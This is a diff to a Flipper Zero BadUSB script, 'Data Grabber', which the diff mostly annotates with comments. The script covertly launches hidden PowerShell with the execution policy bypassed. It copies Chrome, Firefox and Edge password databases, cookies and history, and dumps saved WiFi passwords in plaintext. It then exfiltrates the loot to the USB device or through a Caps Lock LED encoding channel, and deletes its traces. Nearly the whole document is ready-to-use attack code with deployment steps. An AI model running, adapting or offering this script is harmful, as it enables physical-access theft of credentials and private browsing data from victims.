@@ -2,19 +2,40 @@ REM Title: Data Grabber - Windows Browser & WiFi Credentials
 REM Description: Extracts browser history, cookies, passwords & WiFi credentials from Windows
 REM Target: Windows 10, 11
 REM Compatible: Flipper Zero BadUSB
-
-REM ===== DEFINE CONFIGURATION =====
-REM EXPORT_MODE: Choose your export method
-REM   1 = USB mass storage FIRST, fallback to Caps Lock encoding if USB not found
-REM   2 = USB mass storage ONLY (no fallback)
-REM   3 = Caps Lock binary encoding ONLY (no USB attempt)
+REM Author: Mr-Ender8
 REM
-REM CAPS_LOCK_DELAY_MS: Milliseconds between Caps Lock toggles
-REM   Default: 50ms (adjust if too fast or slow for target)
-REM ===== END DEFINES =====
+REM ===== QUICK START =====
+REM 1. Edit DEFINE values below (EXPORT_MODE and CAPS_LOCK_DELAY_MS)
+REM 2. Copy this file to Flipper badusb/ folder
+REM 3. Run on Windows 10/11 system
+REM 4. Check USB or Caps Lock LED for output
+REM
+REM ===== TESTING STEPS =====
+REM Test 1: Run on your own system first
+REM Test 2: Check for output files (chrome_passwords.db, wifi_passwords.txt, etc.)
+REM Test 3: Use decryption tools to verify passwords extracted
+REM Test 4: Adjust DEFINE values if needed and retry
+REM
+REM ===== CONFIGURATION SECTION =====
+REM
+REM EXPORT_MODE Options:
+REM   1 = USB FIRST (try USB mass storage, fallback to Caps Lock if not found)
+REM   2 = USB ONLY (export to USB drive only, fail if not available)
+REM   3 = CAPS LOCK ONLY (binary encoding via Caps Lock LED, no USB attempt)
+REM
+REM CAPS_LOCK_DELAY_MS: Delay between Caps Lock toggles in milliseconds
+REM   20-30ms:  Very fast (may miss on slow systems)
+REM   50ms:     Standard (default, good for most systems)
+REM   75-100ms: Slower systems, older computers
+REM   150ms+:   Very slow, remote desktop, virtual machines
+REM
+REM ===== END CONFIGURATION SECTION =====
 
 DEFINE EXPORT_MODE 1
 DEFINE CAPS_LOCK_DELAY_MS 50
+
+REM ===== EXECUTION START =====
+REM Open Run Dialog and launch PowerShell
 
 GUI r
 DELAY 500
@@ -22,50 +43,76 @@ STRING powershell -w h -NoP -Ep Bypass
 ENTER
 DELAY 1000
 
+REM ===== BROWSER DATA EXTRACTION =====
+
 REM Extract Chrome Data
+REM Target: C:\Users\[Username]\AppData\Local\Google\Chrome\Default\
+REM Files: Login Data (passwords), History, Cookies
 DELAY 500
 STRING $chromePath = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default"; if(Test-Path $chromePath) { Copy-Item "$chromePath\Login Data" "$Env:TEMP\chrome_passwords.db" -ErrorAction SilentlyContinue; Copy-Item "$chromePath\History" "$Env:TEMP\chrome_history.db" -ErrorAction SilentlyContinue; Copy-Item "$chromePath\Cookies" "$Env:TEMP\chrome_cookies.db" -ErrorAction SilentlyContinue; Write-Host "Chrome data extracted" }
 ENTER
 DELAY 500
 
 REM Extract Firefox Data
+REM Target: C:\Users\[Username]\AppData\Roaming\Mozilla\Firefox\Profiles\
+REM Files: *.db files (logins, history, cookies)
 STRING $firefoxPath = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles"; if(Test-Path $firefoxPath) { Get-ChildItem $firefoxPath -Filter "*.db" | ForEach-Object { Copy-Item $_.FullName "$Env:TEMP\firefox_$($_.Name)" -ErrorAction SilentlyContinue } }
 ENTER
 DELAY 500
 
 REM Extract Edge Data
+REM Target: C:\Users\[Username]\AppData\Local\Microsoft\Edge\User Data\Default\
+REM Files: Login Data (passwords), History
 STRING $edgePath = "$Env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default"; if(Test-Path $edgePath) { Copy-Item "$edgePath\Login Data" "$Env:TEMP\edge_passwords.db" -ErrorAction SilentlyContinue; Copy-Item "$edgePath\History" "$Env:TEMP\edge_history.db" -ErrorAction SilentlyContinue }
 ENTER
 DELAY 500
 
-REM Extract WiFi Passwords
+REM ===== WIFI PASSWORD EXTRACTION =====
+
+REM Extract WiFi Passwords using netsh
+REM Command: netsh wlan show profiles
+REM Shows all saved WiFi networks and their passwords in plaintext
 STRING $wifiPasswords = @(); netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $ssid = $_.Line -replace '.*:\s+' -replace '\s+$'; $key = netsh wlan show profile name="$ssid" key=clear | Select-String "Key Content"; $wifiPasswords += "$ssid : $key" }; $wifiPasswords | Out-File "$Env:TEMP\wifi_passwords.txt"
 ENTER
 DELAY 1000
 
-REM ===== MODE 1: USB FIRST, then Caps Lock fallback =====
+REM ===== EXPORT PHASE =====
+
+REM Try to export via USB mass storage (Flipper mounted as drive)
+REM Checks drives E through L for Flipper USB mount
+REM Copies all extracted files to USB
 STRING $found = $false; foreach($drive in @('E','F','G','H','I','J','K','L')) { if(Test-Path "$($drive):\") { Copy-Item "$Env:TEMP\*passwords*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\*history*.db" "$($drive):\" -ErrorAction SilentlyContinue; Copy-Item "$Env:TEMP\wifi_passwords.txt" "$($drive):\" -ErrorAction SilentlyContinue; Write-Host "SUCCESS: USB Export to $($drive):"; $found = $true; break } }
 ENTER
 DELAY 1000
 
-REM If USB found, cleanup and exit
+REM If USB export successful, cleanup and exit
 STRING if($found) { Remove-Item "$Env:TEMP\*passwords*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\*history*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\wifi_passwords.txt" -Force -ErrorAction SilentlyContinue; Write-Host 'File ready on Flipper'; exit }
 ENTER
 DELAY 500
 
-REM ===== FALLBACK: If USB not found, use Caps Lock encoding =====
+REM ===== FALLBACK: CAPS LOCK ENCODING =====
+
+REM If USB not found, fallback to Caps Lock binary encoding
+REM Load Windows Forms for keyboard automation
 STRING Write-Host 'USB not found. Encoding via Caps Lock...'; [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null
 ENTER
 DELAY 500
 
+REM Read WiFi passwords and encode to Base64
 STRING $wifiData = Get-Content "$Env:TEMP\wifi_passwords.txt" -Raw -ErrorAction SilentlyContinue; $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($wifiData))
 ENTER
 DELAY 500
 
+REM Convert Base64 string to binary representation
+REM Each character becomes 8-bit binary (0s and 1s)
 STRING $binary = -join @($encoded.ToCharArray() | ForEach-Object { [Convert]::ToString([byte]$_, 2).PadLeft(8,'0') })
 ENTER
 DELAY 500
 
+REM Send Caps Lock toggles and spaces to encode data
+REM 1 = Caps Lock toggle (+{CAPSLOCK})
+REM 0 = Space key
+REM Each bit is followed by delay (CAPS_LOCK_DELAY_MS)
 STRING foreach($bit in $binary.ToCharArray()) { if($bit -eq '1') { [System.Windows.Forms.SendKeys]::SendWait('+{CAPSLOCK}') }; [System.Windows.Forms.SendKeys]::SendWait(' '); Start-Sleep -Milliseconds 50 }
 ENTER
 DELAY 500
@@ -74,10 +121,13 @@ STRING Write-Host 'SUCCESS: WiFi data encoded via Caps Lock (1=toggle, 0=space)'
 ENTER
 DELAY 1000
 
-REM Cleanup
+REM ===== CLEANUP =====
+
+REM Delete temporary files from system
 STRING Remove-Item "$Env:TEMP\*passwords*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\*history*.db" -Force -ErrorAction SilentlyContinue; Remove-Item "$Env:TEMP\wifi_passwords.txt" -Force -ErrorAction SilentlyContinue
 ENTER
 DELAY 500
 
+REM Exit PowerShell
 STRING exit
 ENTER
